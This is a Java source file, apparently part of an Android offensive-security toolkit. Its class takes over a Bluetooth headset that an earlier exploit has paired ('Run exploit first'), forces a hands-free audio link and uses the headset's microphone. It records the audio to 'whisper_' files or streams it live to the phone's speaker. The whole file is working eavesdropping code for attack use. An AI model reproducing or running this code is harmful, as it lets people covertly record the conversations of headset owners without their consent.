package com.zalexdev.stryker.wpair;

import android.annotation.SuppressLint;
import android.bluetooth.BluetoothA2dp;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothHeadset;
import android.bluetooth.BluetoothManager;
import android.bluetooth.BluetoothProfile;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioAttributes;
import android.media.AudioDeviceInfo;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.MediaMuxer;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class BluetoothAudioManager {

    private static final String TAG = "WpairAudio";
    private static final int SAMPLE_RATE = 16_000;
    private static final int BUFFER_SIZE_FACTOR = 2;

    public static abstract class AudioState {
        public static final class Disconnected extends AudioState { public static final Disconnected INSTANCE = new Disconnected(); }
        public static final class Connecting extends AudioState { public static final Connecting INSTANCE = new Connecting(); }
        public static final class Connected extends AudioState { public static final Connected INSTANCE = new Connected(); }
        public static final class Recording extends AudioState { public static final Recording INSTANCE = new Recording(); }
        public static final class Listening extends AudioState { public static final Listening INSTANCE = new Listening(); }
        public static final class Error extends AudioState {
            public final String message;
            public Error(String message) { this.message = message; }
        }
    }

    public static final class RecordingInfo {
        public final File file;
        public final long durationMs;
        public final long sizeBytes;
        public RecordingInfo(File f, long d, long s) { file = f; durationMs = d; sizeBytes = s; }
    }

    public interface StateCallback {
        void onState(AudioState state);
    }

    public interface RecordingCallback {
        void onRecording(RecordingInfo info);
    }

    public interface ReadyCallback {
        void onReady(boolean ready);
    }

    private final Context context;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Object lock = new Object();

    private BluetoothHeadset headsetProfile;
    private BluetoothA2dp a2dpProfile;
    private AudioManager audioManager;

    private volatile AudioRecord audioRecord;
    private volatile AudioTrack audioTrack;

    private BluetoothDevice targetDevice;
    private volatile boolean isRecording;
    private volatile boolean isListening;
    private long recordingStartTime;

    private StateCallback stateCallback;
    private RecordingCallback recordingCallback;

    private BroadcastReceiver scoReceiver;
    private BluetoothProfile.ServiceListener profileListener;

    public BluetoothAudioManager(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    private BluetoothAdapter adapter() {
        BluetoothManager mgr = (BluetoothManager) context.getSystemService(Context.BLUETOOTH_SERVICE);
        return mgr == null ? null : mgr.getAdapter();
    }

    @SuppressLint("MissingPermission")
    public void initialize(ReadyCallback onReady) {
        try {
            audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            BluetoothAdapter a = adapter();
            if (a == null) { onReady.onReady(false); return; }

            profileListener = new BluetoothProfile.ServiceListener() {
                @Override
                public void onServiceConnected(int profile, BluetoothProfile proxy) {
                    if (profile == BluetoothProfile.HEADSET) {
                        headsetProfile = (BluetoothHeadset) proxy;
                        onReady.onReady(true);
                    } else if (profile == BluetoothProfile.A2DP) {
                        a2dpProfile = (BluetoothA2dp) proxy;
                    }
                }
                @Override
                public void onServiceDisconnected(int profile) {
                    if (profile == BluetoothProfile.HEADSET) headsetProfile = null;
                    else if (profile == BluetoothProfile.A2DP) a2dpProfile = null;
                }
            };
            a.getProfileProxy(context, profileListener, BluetoothProfile.HEADSET);
            a.getProfileProxy(context, profileListener, BluetoothProfile.A2DP);
        } catch (Exception e) {
            Log.e(TAG, "init failed", e);
            onReady.onReady(false);
        }
    }

    @SuppressLint("MissingPermission")
    public void connectAudioProfile(String deviceAddress, StateCallback onStateChange) {
        stateCallback = onStateChange;
        onStateChange.onState(AudioState.Connecting.INSTANCE);

        BluetoothAdapter a = adapter();
        BluetoothHeadset hs = headsetProfile;
        if (a == null || hs == null) {
            onStateChange.onState(new AudioState.Error("Bluetooth not available"));
            return;
        }

        try {
            BluetoothDevice device = a.getRemoteDevice(deviceAddress);
            targetDevice = device;

            List<BluetoothDevice> connected = hs.getConnectedDevices();
            if (connected.contains(device)) {
                onStateChange.onState(AudioState.Connected.INSTANCE);
                return;
            }

            if (device.getBondState() != BluetoothDevice.BOND_BONDED) {
                onStateChange.onState(new AudioState.Error("Device not paired. Run exploit first."));
                return;
            }

            try {
                Method connect = BluetoothHeadset.class.getMethod("connect", BluetoothDevice.class);
                Object res = connect.invoke(hs, device);
                boolean ok = res instanceof Boolean && (Boolean) res;
                if (ok) {
                    registerScoReceiver();
                    handler.postDelayed(() -> {
                        try {
                            if (hs.getConnectedDevices().contains(device)) {
                                onStateChange.onState(AudioState.Connected.INSTANCE);
                            } else {
                                onStateChange.onState(new AudioState.Error("HFP_TIMEOUT"));
                            }
                        } catch (Exception ex) {
                            onStateChange.onState(new AudioState.Error("Connection check failed"));
                        }
                    }, 5000);
                } else {
                    onStateChange.onState(new AudioState.Error("HFP_MANUAL_REQUIRED"));
                }
            } catch (InvocationTargetException e) {
                Throwable cause = e.getCause();
                if (cause instanceof SecurityException
                        && cause.getMessage() != null
                        && cause.getMessage().contains("MODIFY_PHONE_STATE")) {
                    onStateChange.onState(new AudioState.Error("HFP_PERMISSION_DENIED"));
                } else {
                    onStateChange.onState(new AudioState.Error("HFP_MANUAL_REQUIRED"));
                }
            } catch (SecurityException se) {
                onStateChange.onState(new AudioState.Error("HFP_PERMISSION_DENIED"));
            } catch (NoSuchMethodException nsme) {
                onStateChange.onState(new AudioState.Error("HFP_MANUAL_REQUIRED"));
            }
        } catch (Exception e) {
            Log.e(TAG, "connect failed", e);
            onStateChange.onState(new AudioState.Error("Connection error: " + e.getMessage()));
        }
    }

    @SuppressLint("MissingPermission")
    public void startRecording(File outputDir, StateCallback onStateChange, RecordingCallback onComplete) {
        safeStopRecording();
        safeStopListening();
        stateCallback = onStateChange;
        recordingCallback = onComplete;

        AudioManager am = audioManager;
        if (am == null) {
            onStateChange.onState(new AudioState.Error("AudioManager not available"));
            return;
        }
        registerScoReceiver();
        try {
            am.setMode(AudioManager.MODE_IN_COMMUNICATION);
            startSco(am);

            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File pcmFile = new File(outputDir, "whisper_" + ts + ".pcm");
            File m4aFile = new File(outputDir, "whisper_" + ts + ".m4a");

            handler.postDelayed(() -> startAudioCapture(pcmFile, m4aFile, onStateChange), 1000);
        } catch (Exception e) {
            Log.e(TAG, "SCO start failed", e);
            onStateChange.onState(new AudioState.Error("SCO error: " + e.getMessage()));
        }
    }

    @SuppressLint("MissingPermission")
    private void startAudioCapture(File pcmFile, File m4aFile, StateCallback onStateChange) {
        synchronized (lock) {
            int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
                onStateChange.onState(new AudioState.Error("Invalid buffer size"));
                return;
            }
            int actual = bufferSize * BUFFER_SIZE_FACTOR;

            try {
                AudioRecord record = new AudioRecord(MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                        SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, actual);
                routeRecordToScoInput(record);

                if (record.getState() != AudioRecord.STATE_INITIALIZED) {
                    record.release();
                    onStateChange.onState(new AudioState.Error("AudioRecord init failed"));
                    return;
                }

                audioRecord = record;
                isRecording = true;
                recordingStartTime = System.currentTimeMillis();
                onStateChange.onState(AudioState.Recording.INSTANCE);

                Thread t = new Thread(() -> recordAudioLoop(pcmFile, m4aFile, actual), "WpairAudioRecorder");
                t.start();
            } catch (Exception e) {
                Log.e(TAG, "capture start failed", e);
                onStateChange.onState(new AudioState.Error("Capture error: " + e.getMessage()));
            }
        }
    }

    private void recordAudioLoop(File pcmFile, File m4aFile, int bufferSize) {
        byte[] buffer = new byte[bufferSize];
        AudioRecord local = audioRecord;
        FileOutputStream out = null;
        try {
            out = new FileOutputStream(pcmFile);
            if (local != null) local.startRecording();
            while (isRecording && local != null && local.getState() == AudioRecord.STATE_INITIALIZED) {
                int n = local.read(buffer, 0, bufferSize);
                if (n > 0) out.write(buffer, 0, n);
                else if (n < 0) { Log.e(TAG, "AudioRecord error: " + n); break; }
            }
        } catch (Exception e) {
            Log.e(TAG, "record loop", e);
        } finally {
            try { if (out != null) out.close(); } catch (Exception ignored) {}
        }

        File finalFile;
        try {
            convertPcmToM4a(pcmFile, m4aFile);
            pcmFile.delete();
            finalFile = m4aFile;
        } catch (Exception e) {
            Log.e(TAG, "m4a convert failed, keep pcm", e);
            finalFile = pcmFile;
        }

        final File toReport = finalFile;
        handler.post(() -> {
            long duration = System.currentTimeMillis() - recordingStartTime;
            RecordingInfo info = new RecordingInfo(toReport, duration, toReport.length());
            if (recordingCallback != null) recordingCallback.onRecording(info);
            if (stateCallback != null) stateCallback.onState(AudioState.Connected.INSTANCE);
        });
    }

    private void convertPcmToM4a(File pcmFile, File m4aFile) throws Exception {
        MediaCodec codec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_AUDIO_AAC);
        MediaMuxer muxer = new MediaMuxer(m4aFile.getAbsolutePath(), MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
        try {
            MediaFormat format = MediaFormat.createAudioFormat(MediaFormat.MIMETYPE_AUDIO_AAC, SAMPLE_RATE, 1);
            format.setInteger(MediaFormat.KEY_AAC_PROFILE, MediaCodecInfo.CodecProfileLevel.AACObjectLC);
            format.setInteger(MediaFormat.KEY_BIT_RATE, 128_000);
            format.setInteger(MediaFormat.KEY_MAX_INPUT_SIZE, 16_384);
            codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            codec.start();

            MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();
            int trackIndex = -1;
            boolean muxerStarted = false;
            boolean inputEof = false;

            FileInputStream in = new FileInputStream(pcmFile);
            try {
                byte[] pcmBuffer = new byte[8192];
                long ptsUs = 0L;

                while (true) {
                    if (!inputEof) {
                        int inputIdx = codec.dequeueInputBuffer(10_000);
                        if (inputIdx >= 0) {
                            ByteBuffer inputBuffer = codec.getInputBuffer(inputIdx);
                            if (inputBuffer != null) {
                                inputBuffer.clear();
                                int n = in.read(pcmBuffer, 0, Math.min(pcmBuffer.length, inputBuffer.remaining()));
                                if (n < 0) {
                                    codec.queueInputBuffer(inputIdx, 0, 0, 0, MediaCodec.BUFFER_FLAG_END_OF_STREAM);
                                    inputEof = true;
                                } else {
                                    inputBuffer.put(pcmBuffer, 0, n);
                                    codec.queueInputBuffer(inputIdx, 0, n, ptsUs, 0);
                                    ptsUs += (n * 1_000_000L) / (SAMPLE_RATE * 2L);
                                }
                            }
                        }
                    }

                    int outputIdx = codec.dequeueOutputBuffer(bufferInfo, 10_000);
                    if (outputIdx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                        trackIndex = muxer.addTrack(codec.getOutputFormat());
                        muxer.start();
                        muxerStarted = true;
                    } else if (outputIdx >= 0) {
                        ByteBuffer outputBuffer = codec.getOutputBuffer(outputIdx);
                        if ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                            bufferInfo.size = 0;
                        }
                        if (bufferInfo.size > 0 && muxerStarted && outputBuffer != null) {
                            outputBuffer.position(bufferInfo.offset);
                            outputBuffer.limit(bufferInfo.offset + bufferInfo.size);
                            muxer.writeSampleData(trackIndex, outputBuffer, bufferInfo);
                        }
                        codec.releaseOutputBuffer(outputIdx, false);
                        if ((bufferInfo.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) break;
                    }
                }
            } finally {
                try { in.close(); } catch (Exception ignored) {}
            }
        } finally {
            try { codec.stop(); } catch (Exception ignored) {}
            try { codec.release(); } catch (Exception ignored) {}
            try { muxer.stop(); } catch (Exception ignored) {}
            try { muxer.release(); } catch (Exception ignored) {}
        }
    }

    public void stopRecording() {
        isRecording = false;
        safeStopRecording();
    }

    private void safeStopRecording() {
        synchronized (lock) {
            AudioRecord record = audioRecord;
            audioRecord = null;
            if (record != null) {
                try {
                    if (record.getState() == AudioRecord.STATE_INITIALIZED
                            && record.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                        record.stop();
                    }
                } catch (Exception ignored) {}
                try { record.release(); } catch (Exception ignored) {}
            }
        }
    }

    @SuppressLint("MissingPermission")
    public void startListening(StateCallback onStateChange) {
        safeStopRecording();
        safeStopListening();
        stateCallback = onStateChange;
        AudioManager am = audioManager;
        if (am == null) {
            onStateChange.onState(new AudioState.Error("AudioManager not available"));
            return;
        }
        registerScoReceiver();
        try {
            am.setMode(AudioManager.MODE_IN_COMMUNICATION);
            startSco(am);
            handler.postDelayed(() -> startAudioPassthrough(onStateChange), 1000);
        } catch (Exception e) {
            Log.e(TAG, "listen start failed", e);
            onStateChange.onState(new AudioState.Error("Listen error: " + e.getMessage()));
        }
    }

    @SuppressLint("MissingPermission")
    private void startAudioPassthrough(StateCallback onStateChange) {
        synchronized (lock) {
            int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE,
                    AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
            if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
                onStateChange.onState(new AudioState.Error("Invalid buffer size"));
                return;
            }
            int actual = bufferSize * BUFFER_SIZE_FACTOR;
            AudioManager am = audioManager;

            try {
                AudioRecord record = new AudioRecord(MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                        SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, actual);
                routeRecordToScoInput(record);
                if (record.getState() != AudioRecord.STATE_INITIALIZED) {
                    record.release();
                    onStateChange.onState(new AudioState.Error("AudioRecord init failed"));
                    return;
                }

                int trackBufferSize = AudioTrack.getMinBufferSize(SAMPLE_RATE,
                        AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT) * BUFFER_SIZE_FACTOR;

                AudioTrack track = new AudioTrack.Builder()
                        .setAudioAttributes(new AudioAttributes.Builder()
                                .setUsage(AudioAttributes.USAGE_MEDIA)
                                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                                .build())
                        .setAudioFormat(new AudioFormat.Builder()
                                .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                                .setSampleRate(SAMPLE_RATE)
                                .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                                .build())
                        .setBufferSizeInBytes(trackBufferSize)
                        .setTransferMode(AudioTrack.MODE_STREAM)
                        .build();

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && am != null) {
                    AudioDeviceInfo[] outs = am.getDevices(AudioManager.GET_DEVICES_OUTPUTS);
                    for (AudioDeviceInfo info : outs) {
                        if (info.getType() == AudioDeviceInfo.TYPE_BUILTIN_SPEAKER) {
                            track.setPreferredDevice(info);
                            break;
                        }
                    }
                }

                audioRecord = record;
                audioTrack = track;
                isListening = true;
                onStateChange.onState(AudioState.Listening.INSTANCE);

                Thread t = new Thread(() -> audioPassthroughLoop(actual), "WpairAudioPassthrough");
                t.start();
            } catch (Exception e) {
                Log.e(TAG, "passthrough start failed", e);
                onStateChange.onState(new AudioState.Error("Passthrough error: " + e.getMessage()));
            }
        }
    }

    private void audioPassthroughLoop(int bufferSize) {
        byte[] buffer = new byte[bufferSize];
        AudioRecord record = audioRecord;
        AudioTrack track = audioTrack;
        try {
            if (record != null) record.startRecording();
            if (track != null) track.play();

            while (isListening
                    && record != null
                    && track != null
                    && record.getState() == AudioRecord.STATE_INITIALIZED
                    && track.getState() == AudioTrack.STATE_INITIALIZED) {
                int n = record.read(buffer, 0, bufferSize);
                if (n > 0) {
                    if (track.getState() == AudioTrack.STATE_INITIALIZED
                            && track.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
                        track.write(buffer, 0, n);
                    }
                } else if (n < 0) {
                    Log.e(TAG, "passthrough read err " + n);
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "passthrough loop", e);
        }
        handler.post(() -> {
            if (stateCallback != null) stateCallback.onState(AudioState.Connected.INSTANCE);
        });
    }

    public void stopListening() {
        isListening = false;
        safeStopListening();
    }

    private void safeStopListening() {
        synchronized (lock) {
            AudioTrack track = audioTrack;
            audioTrack = null;
            if (track != null) {
                try {
                    if (track.getState() == AudioTrack.STATE_INITIALIZED
                            && track.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
                        track.stop();
                    }
                } catch (Exception ignored) {}
                try { track.release(); } catch (Exception ignored) {}
            }
            AudioRecord record = audioRecord;
            audioRecord = null;
            if (record != null) {
                try {
                    if (record.getState() == AudioRecord.STATE_INITIALIZED
                            && record.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                        record.stop();
                    }
                } catch (Exception ignored) {}
                try { record.release(); } catch (Exception ignored) {}
            }
        }
    }

    @SuppressLint("MissingPermission")
    public void disconnect() {
        isRecording = false;
        isListening = false;
        safeStopRecording();
        safeStopListening();

        AudioManager am = audioManager;
        if (am != null) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    am.clearCommunicationDevice();
                } else {
                    am.stopBluetoothSco();
                    am.setBluetoothScoOn(false);
                }
                am.setMode(AudioManager.MODE_NORMAL);
            } catch (Exception e) {
                Log.e(TAG, "stop SCO", e);
            }
        }

        BluetoothHeadset hs = headsetProfile;
        BluetoothDevice dev = targetDevice;
        if (hs != null && dev != null) {
            try {
                Method disconnect = BluetoothHeadset.class.getMethod("disconnect", BluetoothDevice.class);
                disconnect.invoke(hs, dev);
            } catch (Exception e) {
                Log.e(TAG, "HFP disconnect", e);
            }
        }

        unregisterScoReceiver();
        if (stateCallback != null) {
            try { stateCallback.onState(AudioState.Disconnected.INSTANCE); } catch (Exception ignored) {}
        }
        stateCallback = null;
        recordingCallback = null;
        targetDevice = null;
    }

    @SuppressLint("MissingPermission")
    public boolean isHfpConnected(String address) {
        try {
            BluetoothHeadset hs = headsetProfile;
            BluetoothAdapter a = adapter();
            if (hs == null || a == null) return false;
            return hs.getConnectedDevices().contains(a.getRemoteDevice(address));
        } catch (Exception e) {
            return false;
        }
    }

    @SuppressLint("MissingPermission")
    public List<BluetoothDevice> getConnectedDevices() {
        try {
            return headsetProfile == null ? Collections.emptyList() : headsetProfile.getConnectedDevices();
        } catch (Exception e) {
            return Collections.emptyList();
        }
    }

    @SuppressLint("MissingPermission")
    private void startSco(AudioManager am) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            List<AudioDeviceInfo> available = am.getAvailableCommunicationDevices();
            for (AudioDeviceInfo info : available) {
                if (info.getType() == AudioDeviceInfo.TYPE_BLUETOOTH_SCO) {
                    am.setCommunicationDevice(info);
                    return;
                }
            }
        } else {
            am.startBluetoothSco();
            am.setBluetoothScoOn(true);
        }
    }

    private void routeRecordToScoInput(AudioRecord record) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || audioManager == null) return;
        AudioDeviceInfo[] inputs = audioManager.getDevices(AudioManager.GET_DEVICES_INPUTS);
        for (AudioDeviceInfo info : inputs) {
            if (info.getType() == AudioDeviceInfo.TYPE_BLUETOOTH_SCO) {
                record.setPreferredDevice(info);
                return;
            }
        }
    }

    private void registerScoReceiver() {
        if (scoReceiver != null) return;
        scoReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context ctx, Intent intent) {
                String action = intent.getAction();
                if (AudioManager.ACTION_SCO_AUDIO_STATE_UPDATED.equals(action)) {
                    int s = intent.getIntExtra(AudioManager.EXTRA_SCO_AUDIO_STATE, AudioManager.SCO_AUDIO_STATE_DISCONNECTED);
                    if (s == AudioManager.SCO_AUDIO_STATE_DISCONNECTED) {
                        if (isRecording) {
                            stopRecording();
                            if (stateCallback != null) stateCallback.onState(new AudioState.Error("SCO disconnected"));
                        }
                        if (isListening) {
                            stopListening();
                            if (stateCallback != null) stateCallback.onState(new AudioState.Error("SCO disconnected"));
                        }
                    }
                } else if (BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED.equals(action)) {
                    int s = intent.getIntExtra(BluetoothProfile.EXTRA_STATE, BluetoothProfile.STATE_DISCONNECTED);
                    BluetoothDevice dev = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                    if (s == BluetoothProfile.STATE_CONNECTED) {
                        if (stateCallback != null) stateCallback.onState(AudioState.Connected.INSTANCE);
                    } else if (s == BluetoothProfile.STATE_DISCONNECTED) {
                        if (dev != null && targetDevice != null && dev.getAddress().equals(targetDevice.getAddress())) {
                            disconnect();
                        }
                    }
                }
            }
        };
        IntentFilter f = new IntentFilter();
        f.addAction(AudioManager.ACTION_SCO_AUDIO_STATE_UPDATED);
        f.addAction(BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED);
        f.addAction(BluetoothHeadset.ACTION_AUDIO_STATE_CHANGED);
        context.registerReceiver(scoReceiver, f);
    }

    private void unregisterScoReceiver() {
        if (scoReceiver == null) return;
        try { context.unregisterReceiver(scoReceiver); } catch (Exception ignored) {}
        scoReceiver = null;
    }

    @SuppressLint("MissingPermission")
    public void release() {
        try {
            disconnect();
            if (headsetProfile != null) {
                try { adapter().closeProfileProxy(BluetoothProfile.HEADSET, headsetProfile); } catch (Exception ignored) {}
            }
            if (a2dpProfile != null) {
                try { adapter().closeProfileProxy(BluetoothProfile.A2DP, a2dpProfile); } catch (Exception ignored) {}
            }
            headsetProfile = null;
            a2dpProfile = null;
            profileListener = null;
            audioManager = null;
        } catch (Exception e) {
            Log.e(TAG, "release", e);
        }
    }
}
